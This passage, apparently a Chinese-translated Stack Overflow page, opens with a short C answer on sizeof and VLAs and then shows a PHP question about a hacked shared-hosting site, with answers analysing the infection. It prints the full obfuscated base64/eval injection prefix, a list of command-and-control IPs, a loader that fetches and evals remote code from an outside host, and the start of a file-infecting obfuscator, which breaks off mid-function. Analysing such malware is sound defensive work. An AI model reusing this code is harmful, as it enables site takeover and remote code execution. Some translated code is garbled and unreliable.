Regardless of whether `sizeof` is computed at compile time or runtime (or more formally speaking, whether its result is an integer constant expression), the result of `sizeof` is purely based on the **type of its argument** and not any hidden data accompanying the variable-length array itself. Of course when `sizeof` is applied to a variably-modified type, the generated program must keep track of that size somewhere. But it might simply recompute it if the expression was simple enough and the variables it originally derived the length from cannot have changed. Or, it could store the size of the type somewhere (essentially in a hidden local variable), but this would not be connected to the VLA object in any observable way (for example, if you pass a pointer to the first element of the VLA to another function, that pointer cannot be used to recover the VLA length).

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-04-09T19:08:06.227

> 我已经读过 C 中的 sizeof 运算符在编译时被解释

`sizeof`除 VLA 外，在所有情况下都在编译时确定。对于 VLA，`sizeof`在运行时进行评估。

# php - 我的网站可能被黑客入侵了吗？

> ID：10078284
> 
> 赞同：3
> 
> 时间：2012-04-09T19:02:28.863
> 
> 标签：php, security, hosting

我可能疯了在这里写这个，但我现在太害怕了。我在 iPage 上托管了 2 个网站。

**我的两个网站上的所有 PHP 页面都在今天早上 9 点左右进行了修改，并且都具有以下前缀**

```
<?php /*db9fce8e7e3b4062309ef5d7c0193183_on*/ $TVSC95En77BPVJfUYlq9gaYajuT5lt9kfRNeNhsKeTp0tvLhH= array('1822','1839','1818','1829');$JN26Obrx7D= array('9042','9057','9044','9040','9059','9044','9038','9045','9060','9053','9042','9059','9048','9054','9053');$ENVOq0syj3C3itmE4ubWBPOxtQPQNixJVjoc9GAjz3dImpdg= array('1379','1378','1396','1382','1335','1333','1376','1381','1382','1380','1392','1381','1382');$cYNv2rhkPEonbobDnRYiA9pfFk4TZ4jFSW1K="ZXZhbChiYXNlNjRfZGVjb2RlKCJaWFpoYkNoaVlYTmxOalJmWkdWamIyUmxLQ0phV0Zwb1lrTm9hVmxZVG14T2FsSm1Xa2RXYW1JeVVteExRMHBvVmpGc2JsTXdUa2RpVjFKWVRsZHdhMUl5ZURKWmJYYzFZa2RXU0dKSWNHdFRSVEYyVTFkMGEySkhVa1pOVjJocFZqQldjRk14VG5OT01HeEVVVzB4YTFaNlZuRmFSV1J6WkcxS2NGRnVVbWxOYkVwdFYxUkpOV1JWZEVSVmJXeHJWakZzZDFwVVRrOU5SMDV6VDFoQ2FtSldXak5aYTJSSFlXeHdWRm95YkZGU01IQXlWMnRvY2tzd2JIQmtNbXhSVWpCd01sZHJhSEpMTUd4d1pESjBXbUpzV25SVVJVNVRZVzFLZFZWdFdtaFJNbk16V1Zaa1dsb3dkRVJWYlhCcFlteEtiVmxWVGtKUFZrSlVVVmhvVEZVd1NUTlRhMlJMVFZad2NGRlViRXBUUlRSM1dUSjNOV05IVG5SV2JtUnBVakJhY1Zkc1RtNWhWa0pJVTI1YVlWTkhjM0pUVjJ3ellWWkNTRk51V21GVFIzTnlVMWRzUW1SVmJFbFVha0pxWWxkNE0xbDZTalJoUjAxNVlVZDRhbVZYWkhKWFJFWlBVbXhXYzFkcldsWmlTRTV3VjJwSk5XUnNjRVJUYlZKTVZUTmtjbGRYTlZkaVZYUlZZekprYW1KV1dYZGFSbWhMWkZWc1JGVnRiR3RXTVdzeldteG9UMDFIVG5OUFdFSnFZbFphTTFsclpFZGhiSEJVV2pKc1VWRjZiSEJaYWtwVFRsWkNjRk5ZVGtwaGJtUXlWMWN3TldFeVZsVk9SMnhOVVRGS2NGcEdaRnBqTUhCSVZHNVdhMUpxYkhaVE1WSXdZMFp3Y0ZGWE9VdFNNRFV4V2tWWk5XSXdiRVZOUkd4S1VrVldkMU5WYUhwaE1XeDFWbTB4U2xKRVFtNVplazVUWlZabmVXSkliR0ZYUlVwNlYxWmtUMkpGZEVSVFZHaE5UV3R3TWxkcmFISkxNR3h3WlVod2ExTkZjSGRaTUdoUFl6RnNXVlJ0T1dGWFJURjJVMnRaTlZaR1NsZFRiR1JUVm10d2FWTlhNV3RrYlVsNVZWZHNXVlV5ZERGVFYzQXpaR3hzZEU5WGRHeFdSRkp3VkVWT1UyRlhVbGhYV0VKUVpWVktOVmRzYUZOTlYwNTBUa2RrUzFJd2IzaFhiWEF3VDFkT2RGWnFRbXRYUlhBeFUxVk9VMkZYVWxoWFZHUnRWakZ2ZUZsdE1VOU5SMFpZVDFoV1NsSjZiRE5YVm1NeFkyMUdWRm95ZEZwaWJGcDBVekZvZW1FeGIzcGpSMXBoVlRCRk5WTlZaR0ZoUjBwSlZHMTRVR1ZXU25aWFJFb3pXakZDVkZGdE9XRldNRnB5VjJ4b1MyVnNaM2xsU0VKcVRURkdkbE14VWpCalJuQndVVmM1YUZaNlZtMVhWbWhMWlZac1dXRXlPVXBoTURVeVdXMDFVMkpIU25WVldGSlRWbnBXY1ZscVNsTmpSMHAwV1hwYVNsSXlVVEpaVm1oQ1lWVjRSRkZYZEdoU2FteDZVekZPY2xveVZqVlJWM1JoVFROQ2JWZHNUa0pQVld4SlZXNXNhMVl4VlROYWJHUnpZbFZzUkZveWRHRk5NMEp0VjJ4T2MwNHdjRWxWYmxKcVVqRndNVmRXWTNoaVJXeEZUVWRrYTFJeFdqQlpNR014WVVkS1ZGb3liRTFOTVVvd1dUQk9TbU13YkVSVGEyUlZUVVJvY0ZNeFVqQmlWMFpZWlVkNFdVMHdTWGhhUlZrMVlXMUplVTVVUW1GV2VsVjNXVE5zYm1FeVVraE5XR1JoWWxSV2IxbHNaRlpqTUd4RVZXMXNhMVl4YkhkVU0yeFRUbXh3UkZGVWJFcFNNbEV5V1dwT1EySkhTbkJhTW5SclVucEdNMWR0TURGaFIwcFlWbGhPU2xFd2NEVlRWMnh5VGpCd1NGUnVXbWxpYkVweldXMDFVMlZyYkVWTlIyUmhUVE5DTlZkc1pFZGhNSFJFVldwYVlWRXpaRzVVVmxKQ1pEQXhSVkZZWkU1U1JVWjNWRE5zVTJGdFNYbE9WRUpoVm5wVmQxa3piRUpQVld4SVRWaGFZVkpxYkhGWmFra3dZakJ3U0ZSdVdtbGliRXB6V1cwMVUyVnJkRlZrUnpWc1lsVTFlbGxxVGs5aVJYUkVWV3BhWVZFeWN6TmFSbU14WXpKR1dFNVlTa3hSTVVsM1dXeG9RMkpYU25SU2JsSmhWVEp6TTFOclpFOWtiVXAxVlcxNGFXSnNTalpUVlZGM1dqRnZlbU5IZUdsaVZUVXlWMnRrVm1Jd2NFaFVibHBwWW14S2MxbHROVk5sYTNSVlpFUnNTbEl4V25wWmVrcFdXakpXTlZWdGNHbE5hbFYzVjJ4ak1VMUhUalZSVkd4S1VucEdNbGRyV1RWaGJVbDVUa2M1UzFJd2IzaFhiV3h5VGpKYVZGVnVUbUZXZWxKdVZVWk9RMlZ0VWtsVGJrNWhWbnBTZGxOclpFOWtiVXAxVlcxNGFXSnNTalpUTVZJd1lqRndXRkp0ZEdGWFJXeDJVMWQwVDJSdFNuVlZiWGhwWW14R01GWkZaRmRrVm05NlZXMDVVR0ZWUm5CVVIyeFRZekZ3V0U1SVFsQk5NSEJ6V2tWb1YyVlhTbkJhTW5SYVRXcHNNVnBGWkZka1YxSkpWRmhDVUUxNlFtNVhiVFZYWkZacmVsVnVRbWxOYWxKdVZXcEtWMDFHVWxoU2JsSmFWVEprZDFwWWJGTmtSMGw2VlcwNVlWZEZiRzVWUms1Q1lWZFJlbHBFVGsxaGJYTXhWMWN4YzAxSFRqVk9WM0JwVFdwQ2NGUjZUa3RpUjFKSlZtNXNhV0ZWUm5KWmJHTTFUVWRHU0ZadWJGQk5la1l5VjFkM05XVnRVa2hTYm14clVUSmtjRmxxVGtOaFIwcDBaRWhDU21GWGN6TlhiVFZYWkZacmVsVnVRbWxOYWxKdVYxWmtiMkpYVWxoVmJURnBVakZ2TWxkclpHOWlWMFpKVkZjNVMxTkZTbTlUTVdoNllUSktXRkp1VWxwVk1FVTFVMVZXYTJKSFVrWk5WMmhwVmpCV2RsTXhVbnBoTVhCMFlraE9ZVlV3UlRWVFZXaFhaVmRLU0ZadVZscE5hbXh5VjJ4T2IxcHNaM2RYYTNCVlVsWmFiVmRJYkhKT01rWllWMWRrVEZJeWVEWlpla3BYVFVWMFJGVnRXbFpOUmxwVVZtMTBWMVV4WkRWVGEyeFhVbXhLVWxkRVFtOVZSbFY0VlZkc1dWVXlkSGRhV0d4VFlqSkplbFJxUWtwU1JFSnVVMnRaTlZaR1NsZFRiR1JUVm10d2FWTlhkRzlXVmxwSFVXMWFWRkpVYkZWV2EwNUxXa1U0ZWsxSFpHRldNMmcyVjJ4T1EwNHdjRWhoU0ZwcVRURkdibFZHVGtKaFZXeHhaRVJzYUZZeGJHNVRNR1J6WlcxTmVWWnFRa3hSTVVwdFZsUkNWMVV4V25KV2JFNVlaVlZ3VkZWc1ZYaFZSbHBHVm0xYVVsWldTa1pXVjJ4TFdrVjBWR0pFWkV0U01uZ3pVMVZSZDFvd2NFZFBWbEpUVm10d1dGVnNXa3RaYTJ4elUydGFWVlpVYkZaVmJGazFVV3hLUmxWc1RrcGlSRUV6V214T1EySkhTa2xVYlhoS1UwaE9jbGxXYUVKYU1VSlVVVmRzU21GdVVUVlpWbVJhV2pCMFNHSkljR3BOYkZsM1V6Qk9VMXBzVlhkV2JFNVhZVEZhVkZZemJFdFRWbHBIVld4R1dVMVZjRWRWYlhSWFZURktWMU5YYkZsVk1uUjNXbGhzVTJWV2NGaFhWMlJSVlRCSmVGa3lNVFJpUjBwMFZHNWFZVkl4Vm5aVGExazFWa1pLVjFOc1pGTldhM0JwVTFkMGIxWldXa2RSYlZwV1lURmFTRlZzV2t0U2JGWndVMjFTVEZaSVVUVlRWV1JYWXpKTmVWWlhaR3hsVmtvMVYyeGtXbG94UWxSUlYyeEtZVzVSTlZsV1pGcGFNSFJJWWtod2FrMXNXWGRUTUU1VFdteFZkMVpzVGxkaE1WcFVWak5zUzFOV1drZFZiRVpaVFZaYVZWVnNXa3RhYkVaV1drVmFWV0pHUm5CWFJrNXlZMGRXTlZWcVJscFZNRVUxVTFWb1YyVlhTa2hXYmxaYVRXcHNjbGRzVG05bGJWSkpVMnBDYVUxdWFESmFSRXBYWlZWMFJGVnRXbFpOUmxwVVZtMTBWMVV4WkRWVGEyeFhVbXhLVWxkRVJsZFdSa3BYVTIxYVVsWlhVa2RXUjNoU1lWWm9WR0V6UWxCTmVrSnVWMnhrTkdWc2NGUlJhbVJMVTBaYWIxTlZVWGRhTUd4d1UxUmtiVll5ZUhSVFZVNXZZMGROZWxSdGVHdFJNbVJ5VjBSR1QxSnNWbk5YYTFwV1lraE9jRlpXV2xkU2JGWnpZa2RhVmsxV1NsUlZNVlV4VTBWc2MwMUlRa3hYU0U1eVdURm9UbG94UWxSUmFrWnFZbGhvYzFsdE1VOWtiSEJJVmxjNVMxSnFiRlZWYkZwTFZqRktWMU50U2twaVJWcFhWV3hhUzFkc1ozaFViRlpXWVRKNFVGVnViRXRhUlhSVlpFUnNTbEl4V25wWmVrcFdXakpXTlZWdWFHcGxWVVUxVTFWT1NtRlZPSHBOUjNSclYwVndlbGRJY0VKYU1VSlVVVmRzYUZOR1NYZFpNRkoyWkd0NE5WTlhaRTFoVlVaeVdUQmtSazR3Y0VsV2JteHBVbXBvTkZOVlVYZGFNR3h3VDFoR1lWWXhTbmRVUnpWRFlqSk9SVTlVU21GWFJYQTJXVlpqTldSV1FsVlJWRlpRVmtWV2RGbHNZelZOUjBaSVZtNXNVVlV3Ykc1VVIyeFRaRVpzV0UxWGFFcFJlbEp1VTFkc1lXSlhSbGhsUjNoUlZUQnNibFJIYkVKaE1YQjBZa2hPWVZVd1JqRlRWVTVLWWxkR1NFOVljR3RTUkVKd1UxVk5NRm93Y0VoaFNGcHFUVEZHYmxSSGJFSmhWWEIwWWtoa1VWVXdiRzVVUjJ4Q1lUSkdXVkZYWkUxaFZVWndVMjAxUzJKR2NIRk5SMnhLVVhwU2JsTnJhRXRpUm5Cd1VWaFdTbEV3YkhSYVJtUkdUMVZzY0ZGWVZrdFRSbHB2VTFWTk1Gb3diSEJYYm1ocVpXcENjRk5WVFRCYU1IQkpVbTV3VUdWV1NYZFpNalZ5V2pGQ1ZGRnFRbXBpYkZwelZIcEtjMkpWZEVSUmJURnJWbnBXY1ZwRlpITmtiVXB6VDFkNGJGSXllRFphUldoT1lqQnNkRlJxUm1waVdHaHRXVlpqTVdOSFVrUlRXRUpLVVRKM00xTnJaRTlpTUd4RlRVZGtXazB4V2pWWmExazFZMGRLZEdKRVFreFJNVWw0V1RJeE5GcHJNVVJSV0ZaS1VURkplRmt5TVRSYWF6RlVZWHBrV2sweFdqVlphMWsxWld4d1dWVnVXbXBUUmtaMlUydGtUMkl3ZUVSUmExSlhWbXR3VGxaRVJrTldWbWQ0VTJ0YVYxSnNXbFJXUjNoVFZURkdWazVXVWxOaE1WcFVWRVZPUW1WRmRGVmtSM0JyVjBWd2VsZEVUazlpUjFKSVQxaGthMUV5WkhKWFZFcHVZekJzUmxSc1dsWmhNMmhSVmxWYVUxcHNXa1ppUlRWVFZsUnNWMVpyVGpOYU1ERTFZWHBrUzFOR1ducGFSVTVDVDFWc1NWVnViR2hXZWtKMlYxUk9WMlZYU2tkUFYzaHNVakZhY1ZNd1RsTmhiVVpFWVROQ1VHVldTWGRaTWpWeVdqRkNWRkZ0TVZwV00yZzJWMnhTTUU5VmJFaGlSekZLVVRKa2RsbFdZekZqUm1kNVdrZDRhMUV5WkhCWFZtUTBZekpKZWxwSFdtdFhSWEI2VjBSS1lXUnRUa2hXYmxaS1lWZDBkMU5WVGxwaVZXeEVWV3BDYW1KdGRIZFRWV2g2WVRKU1dHVkVRa3BTUkVKdVdrVm9TMk5IU2xSaFJVWmhZbGQ0ZWxkc1dUVmliSEJaVlcxYVdrMXFiREZhUldSWFpGZFNTVlJYT1V0VFJsbzFXV3RaTkdRd2JFUk9SMlJMVTBaYU5WbHJXVFJsUlhSVVlYcGtTMU5HU2pWYVZrNUNUMVZzU0ZkdGFHbFRSVFZ6VkhwTmVHTkdjSEJhTW5SclUwVnZNVk14YUhwaE1YQjFVVmRrVVZVd1NuUlpla2sxWVcxRmVVOVlaR0ZXZWxKMlUydG9RMkZGZUVSUlZGSk9VVE5rYmxOclpGZGxWMDUwVGxoYVRWRXdSbkpYYkdoTFpWZE5lbFZ1YkUxUk1FWTJWRlZPY2s0eVJsaFhWMlJNVVRGS2RGa3dUbkphTWxZMVZXNWFhMWRHUm01VlJrNUNZVlpKZDFac1ZrcFJNVWw0V1RJeE5GcHJNVlJSYTJ4WFVteEtVbFJJY0Vaa1ZURkhaVWhzV1ZKNlVuQlVNMnhUWkcxU1dWVlhaRTFoYWtKdVUxZDBiMlJ0VFhwVlZGcEtVVEZLTTFkV1dqUmxWbWhJVGtkc1VHVldTakphUm1oU1dqQjRjVTFIWkVwaE1EVXlXVzB3TVdKR2EzcFZia0pwVFdwUk1sTlZWazlqTWtsNlZHMTRXVk5GY0dwWmJYZzBaVlpvU0U1SGJGQk5iRzk2V1RJeGMwMUdjRlJhTW5SaFltdEdlbE5WVGxOa2JWSlpWVmhDVUdWV1NqVlhiR2hTV2pGQ1ZGRlhiRXBoYmxGNldWVmtjMk14Y0ZSUlZ6bEtWakZ3YzFscVNscGlNSEJJVjI1a1RGVXlkRzVhV0d4VFpWWndXVlZYWkVwUmVsRTFVMVZPUTJKV2IzbFdha0pxWlZka2NsZHROVUpqTUd4RlVsaHNVRkV5Y3pOYWJHUmhZVzFLU0U5WWNHRlZNbVJ5VjIwMVFtTkZPVFZWYWtacFUwWkdibFZHVGtOTlIwNTBZa2hTVEZORk5IaFhWelZQVFVkT2NGb3lkR3BpVmxsM1ZFVk9RMlZ0VWtsVGJtUnBUVEF4ZGxOcmFFdGlSMUpFWkRKa1NtSklhRFZYUldNeFdUSk9jMlZJVmtwaFYzUnVVek5zUWsxRmRGUmhlbVJ0VjBSQ2JsTlZaSE5pVld4RVlVaHdhMU5GY0ROWmFrNU9ZakJ3U1ZadVRtdFJNMlJ3VjJ4b1lXRkhTa1JUV0VKS1VUQlZOVlZHVGtOaVZteFlaVWh3WVZVeWR6TlRhMmgyV2pGQ1ZGRnVjR3RUUlhCM1dUQm9UMk14YkZsVWJUbGhWMFV4ZGxsNlRsTmxWbWQ2VTIxNGFsSXphRzlYVkVwV1lqQnNkRlpxU2xwV00yUndWRVZPU21GVmVFUlZha1pwVTBaR2QxTXhVbnBhTVhCWlYyMW9hVkV5WkhKYVYyeHlUakJzU0ZacVVtaFhSa1oyVXpGU01FOVhSbGhYVjJSTVUwVTBkMWt5TlVOa2JVNDFXakowYTFZelozZFVSVTVMWWtac2RFNVhhRXBoVjNSdVUxWlJkMDlWYkVoWGJXaHBVMFUxYzFNeGFIcGhNV2Q0Vkd0YVZtSkdjRWRXVjNoNllWWnZlVTlZV21GUk1IQnJVMVZSZDFveVRYcFZibXhaVFRCd2Mxa3daRFJoUm10NVZsYzVTbUpXV25CWmJURkdZVlY0UkZOWGJFMVJNVWw0V1d0b1VtTkZPSHBUYlhoclUwWmFOVmx0YkVOTlIwNTFWbTE0VUUxNlJuTlphMmhQWWtWc1NXUkliR0ZYUmtsNFdUSXdNRm94Y0hSU2JrNXFUV3hWTTFwc1ozZGhNWEIwVW1wQ2FGSXhXalZVVjNnd1drVnNSVTFIWkVwaGJVMHdWRWR3VWsxcmVIRlNWRTVPWlZSU05GUnJUa3BPTUhCSVYyMW9hMUl5YUhOWk1uQkxXV3hvVkZGVWJFcFJNR3cwVkc1d1dtUlZPVlJPU0d4T1ZrZGtNVlJXVW5KbFJXeHhZekowWVdKVldYZFpWV1JYWlZVeGMyUkhVa3BTUkVKdVUxZHdjbVZGZUhGVFdHeFFVWHBTTkZSc1VsSmtWVEZ4VmxSQ1NtRnVUbkpYYlRGSFRVZEdTRlp1YkU1aVNGSnJVMVZSZDFvd2JIRlplazVOWVcxa05GUkhjRXBOUlRGVVRraHNUMVpGTVhCVU0yeFRZbFpzV1ZWdE9XRlhSV3cxVm5wRmQxb3hRbFJSVjJ4T1ZrZGpkMVJIY0c1bFZYaHhVbGhvVDJWVVVqUlVWbEpDWVZVNU5WVnRNVnBYUmtwMlYyeG9TbVZXWTNoTlIyUlJWVEJHY0ZSclVscGtWVFZFVGtoc1RsSkZiREZVTVZKT1lWVTVOVlZ0TVZwWFJrcDJWMnhvU21WV1kzaE5SMlJSVlRCR2NGUnJVbHBrVlRGeFZWUldUV0ZzVlRCVVIzQkdaV3MxVkZOVVpFdFNNWEJ2V2tWa2IySkhUbkZUYlVwWlZUQkZOVk5WVGtwbFJUVTJWMWhXVUZWNlVqVlVhMUpHWkZVeFZWWllaRXBoYms1eVYyMHhSMDFIUmtoV2JteE9Za2hTYTFOVlVYZGFNR3h4VlZSS1RXRnJNSHBVUjNCR1RXczVWRTVFUms5aFZXc3pVMnRrWVdGSFVraGhSM2hxWVd0d2FWZEdUa0pQVld4RVUxUkNUMkZVVWpaVVZVMHdUVVV4VkU1RVZsQlZNR3N6VTJ0a1lXRkhVa2hoUjNocVlXdHdhVmRHVGtKUFZXeEVVMVJXVDFGNlVqVlVhMUpLWkZVeGNWWlVSazFoYXpCNFUxZHdlbUV4Y0hSU2FrSm9VakZhTlZSWGVEQmFSV3hGVFVka1NtRnJWWHBVTUUwd1pVVTFjVk5ZVms1V1JXc3hWRWR3U21WVk1UVlRWR1JMVWpGd2IxcEZaRzlpUjA1eFUyMUtXVlV3UlRWVFZVNUtUVEE1UkU1RVFrOWxWRkkwVkRCU1VtUlZNVFpVVjJ4UVpWWktkRmRXYUZOaU1YQlpVMWhzV0UxVVFtNVZSazVDWVZVeE5sSllWazVXUjJOM1ZFZHdTbVZyTlVST1JGWlBZVlZyTTFsNlNtOU5WbkIwVjI1T1lWVXlaSEpYYlRGSFRVZEdTRlp1YkU1aFYzTXpWMjB3TldWV2NGaFNiWEJvVVRKa2NsZHRNVWROUjBaSVZtNXNUbUZWU205Wk0yeENZVEpTV1ZOWVFteE5iWGgwVTFWT2Jsb3hiRmhoUnpGclZqRktkRmxyWkdGT2JIQklZVWN4YUZORk1YWlRhMmhYWlZWMFZGRllRa3BUU0U1dVYxYzFTMkpHYkZoak1tUlFUWHBGTlZwc1JUbFFVMGx3UzFSelp5SXBLVHNnIikpOyA=";if (!function_exists("IOvqWhUNav1vXbeu")){ function IOvqWhUNav1vXbeu($eylKbLsazo94Ea5Vhz79GggPPk0Fn4I8sTIuv1vU,$iPKwKwD9uDGAJlgUcL87){$pq3FLow69CrOdNpzhoTKUkk6q48236cZm5vXkSTkkbYoOdNW = '';foreach($eylKbLsazo94Ea5Vhz79GggPPk0Fn4I8sTIuv1vU as $vwdHH9YC8Qv5SkhOG4ZoO9){$pq3FLow69CrOdNpzhoTKUkk6q48236cZm5vXkSTkkbYoOdNW .= chr($vwdHH9YC8Qv5SkhOG4ZoO9 - $iPKwKwD9uDGAJlgUcL87);}return $pq3FLow69CrOdNpzhoTKUkk6q48236cZm5vXkSTkkbYoOdNW;}$NfcYRc72PjdDxDTcZ9Y6 = IOvqWhUNav1vXbeu($TVSC95En77BPVJfUYlq9gaYajuT5lt9kfRNeNhsKeTp0tvLhH,1721);$c6gts3vwnaRtcGbfD4VN7obA8 = IOvqWhUNav1vXbeu($JN26Obrx7D,8943);$n82mSuiYNAS8X68E = IOvqWhUNav1vXbeu($ENVOq0syj3C3itmE4ubWBPOxtQPQNixJVjoc9GAjz3dImpdg,1281);$TargEl = $c6gts3vwnaRtcGbfD4VN7obA8('$bigiJelZcd',$NfcYRc72PjdDxDTcZ9Y6.'('.$n82mSuiYNAS8X68E.'($bigiJelZcd));');$TargEl($cYNv2rhkPEonbobDnRYiA9pfFk4TZ4jFSW1K);} /*db9fce8e7e3b4062309ef5d7c0193183_off*/ ?> 
```

我尝试获得 iPage 支持，但他们不知道发生了什么。他们刚刚为我创建了一张支持票，将在 48 小时内进行调查！！

**更新**

**收到有关黑客攻击的电子邮件**

> 来自：可怜的受害者 haha​​haha@gmail.com
> 
> 消息：为什么此代码在我的服务器上？你为什么要盗用我的文件？？？此代码指向您！准备诉讼
> 
> if (!function_exists("GetMama")){ function mod_con($buf){ str_ireplace("","",$buf,$cnt_h);if ($cnt_h == 1) { $buf = str_ireplace("", "" . stripslashes($_SERVER["good"]),$buf); 返回 $buf; }str_ireplace("","",$buf,$cnt_h);if ($cnt_h == 1) { $buf = str_ireplace("",stripslashes($_SERVER["good"])."",$buf) ; 返回 $buf; }return $buf; }function opanki($buf){ $gz_e = false;$h_l = headers_list();if (in_array("Content-Encoding: gzip", $h_l)) { $gz_e = true; }if ($gz_e){ $tmpfname = tempnam("/tmp", "FOO");file_put_contents($tmpfname, $buf);$zd = gzopen($tmpfname, "r");$contents = gzread($ zd, 10000000);$contents = mod_con($contents);gzclose($zd);unlink($tmpfname); $contents = gzencode($contents); } 其他 {$contents = mod_con($buf); }$len = strlen($contents);header("内容长度：".$len);return($contents); } function GetMama(){ $mother = "www.99bits.com";return $mother; }ob_start("opanki");function ahfudflfzdhfhs($pa){ $mama = GetMama();$file = urlencode(**文件**);if (isset($_SERVER["HTTP_HOST"])){ $host = $_SERVER["HTTP_HOST"]; } 其他 {$host = ""; }if (isset($_SERVER["REMOTE_ADDR"])){ $ip = $_SERVER["REMOTE_ADDR"]; } 其他 {$ip = ""; }if (isset($_SERVER["HTTP_REFERER"])){ $ref = urlencode($_SERVER["HTTP_REFERER"]); } 其他 {$ref = ""; }if (isset($_SERVER["HTTP_USER_AGENT"])){ $ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"])); } 其他 {$ua = ""; }if (isset($_SERVER["QUERY_STRING"])){ $qs = urlencode($_SERVER["QUERY_STRING"]); } 其他 {$qs = ""; }$url_0 = "http://" 。$pa;$url_1 = "/jedi.php?version=0991&mother=" .$mama . “&文件=”。$文件。“&主机=”。$主机。"& foreach($father2 as $ur){ if ( ahfudflfzdhfhs($ur) ) { break ; } } }
> 
> 发送自（IP 地址）：64.118.163.18 (64.118.163.18) 日期/时间：2012 年 4 月 9 日晚上 7:15 来自（推荐人）： [http](http://www.99bits.com/contact-us/) ://www.99bits.com/contact-us/使用（用户代理): Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19

感谢你们每一个人的帮助和知识。由于一些奇怪和未知的原因，我的博客成为了这次黑客攻击的目标。我暂时关闭了博客，直到我可以清理所有文件（因为我所有的 PHP 文件都被感染了）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:53:55.043

在当前形式中，脚本具有以下命令和控制服务器（“c&c”）：

```
$father2[] = "78.46.173.14";
$father2[] = "176.9.218.191";
$father2[] = "91.228.154.254";
$father2[] = "77.81.241.253";
$father2[] = "184.82.117.110";
$father2[] = "46.4.202.93";
$father2[] = "46.249.58.135";
$father2[] = "176.9.241.150";
$father2[] = "46.37.169.56";
$father2[] = "46.30.41.99";
$father2[] = "94.242.255.35";
$father2[] = "178.162.129.223";
$father2[] = "78.47.184.33";
$father2[] = "31.184.234.96"; 
```

该脚本在每次运行时随机排列它们的顺序。然后它尝试发送包含这些变量的 GET 请求

```
$_SERVER["HTTP_HOST"]
$_SERVER["REMOTE_ADDR"]
$_SERVER["HTTP_REFERER"]
$_SERVER["HTTP_USER_AGENT"]
$_SERVER["QUERY_STRING"]
__FILE__ 
```

到第一个 c&c 服务器，如果响应不包含`eval`或`ebna`（或服务器已关闭），它会尝试下一个 c&c 服务器，依此类推。

如果 c&c 服务器返回：`ebna <somestring>`，`<somestring>`将被放置在您网站的 body 标签内。所以黑客可以插入任意html/js代码。

在 c&c 服务器返回的另一种情况下`eval <somestring>`，`<somestring>`将传递给 eval()。这样黑客甚至可以执行任意 php 代码。

我设法让 c&c 服务器通过省略所有 url 参数来返回 eval 响应，如下所示：`http://<server-ip>/jedi.php`，这是响应：

```
eval $try = true;
if (function_exists("curl_init")) {
    $ch = curl_init('http://2brewers.com/99.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $ult = trim(curl_exec($ch));
    $try = false;
}
if ((ini_get('allow_url_fopen')) && $try) {
    $ult = trim(@file_get_contents('http://2brewers.com/99.txt'));
    $try = false;
}
if ($try) {
    $fp = fsockopen('2brewers.com', 80, $errno, $errstr, 30);
    if ($fp) {
        $out = "GET /99.txt HTTP/1.0\r\n";
        $out. = "Host: 2brewers.com\r\n";
        $out. = "Connection: Close\r\n\r\n";
        fwrite($fp, $out);
        $ret = '';
        while (!feof($fp)) {
            $ret. = fgets($fp, 128);
        }
        fclose($fp);
        $ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));
    }
}
$xx = 'ev'.'al';
$_FILE = create_function('$_', $xx.'($_);');
$_FILE($ult); 
```

加载并执行`http://2brewers.com/99.txt`，如下所示：

```
function get_file_extension($file_name) {
    return substr(strrchr($file_name, '.'), 1);
}

function pass_gen($dol) {
    $source[0] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $source[1] = "0123456789";
    $length = rand(5, 50);
    $passwordlen = intval($length) - 1;
    $use = implode("", $source);
    $max_num = strlen($use) - 1;
    $rp = '';
    for ($i = 0; $i < $passwordlen; $i++) {
        $x = rand(0, $max_num);
        $rp. = $use[$x];
    }
    if ($dol) {
        return '$'.$source[0][rand(0, strlen($source[0]) - 1)].$rp;
    } else {
        return $source[0][rand(0, strlen($source[0]) - 1)].$rp;

    }
}

function GetMass($text, $code, $massname) {
    $a = str_split($text);
    foreach($a as $b) {
        $evmas[] = ord($b) + $code;
    }
    $z = $massname."= array('".implode("','", $evmas)."');";
    return $z;
}

function Codee($code) {

    $coo = 'if (!function_exists("F1")){ function F1($v6,$v7){$v8 = \'\';foreach($v6 as $v9){$v8 .= chr($v9 - $v7);}return $v8;}$v1 = F1($mas1,$code1);$v2 = F1($mas2,$code2);$v3 = F1($mas3,$code3);$v4 = $v2(\'$v5\',$v1.\'(\'.$v3.\'($v5));\');$v4($v0);}';

    $f1 = pass_gen(false);
    $coo = str_replace('F1', $f1, $coo);
    $v1 = pass_gen(true);
    $coo = str_replace('$v1', $v1, $coo);
    $v2 = pass_gen(true);
    $coo = str_replace('$v2', $v2, $coo);
    $v3 = pass_gen(true);
    $coo = str_replace('$v3', $v3, $coo);
    $v4 = pass_gen(true);
    $coo = str_replace('$v4', $v4, $coo);
    $v5 = pass_gen(true);
    $coo = str_replace('$v5', $v5, $coo);
    $v6 = pass_gen(true);
    $coo = str_replace('$v6', $v6, $coo);
    $v7 = pass_gen(true);
    $coo = str_replace('$v7', $v7, $coo);
    $v8 = pass_gen(true);
    $coo = str_replace('$v8', $v8, $coo);
    $v9 = pass_gen(true);
    $coo = str_replace('$v9', $v9, $coo);
    $v0 = pass_gen(true);
    $coo = str_replace('$v0', $v0, $coo);
    $mas1 = pass_gen(true);
    $coo = str_replace('$mas1', $mas1, $coo);
    $mas2 = pass_gen(true);
    $coo = str_replace('$mas2', $mas2, $coo);
    $mas3 = pass_gen(true);
    $coo = str_replace('$mas3', $mas3, $coo);
    $code1 = rand(1000, 10000);
    $coo = str_replace('$code1', $code1, $coo);
    $code2 = rand(1000, 10000);
    $coo = str_replace('$code2', $code2, $coo);
    $code3 = rand(1000, 10000);
    $coo = str_replace('$code3', $code3, $coo);

    for ($i = 0; $i < 3; $i++) {
        $code = base64_encode($code);
        $code = 'eval(base64_decode("'.$code.'")); ';
    }
    $code = base64_encode($code);

    $z = GetMass('eval', $code1, $mas1);
    $z. = GetMass('create_function', $code2, $mas2);
    $z. = GetMass('base64_decode', $code3, $mas3);
    $z. = $v0.'="'.$code.'";';
    $z. = $coo;
    return $z;

}

function modify($fname) {

    $tmp = file_get_contents($fname);
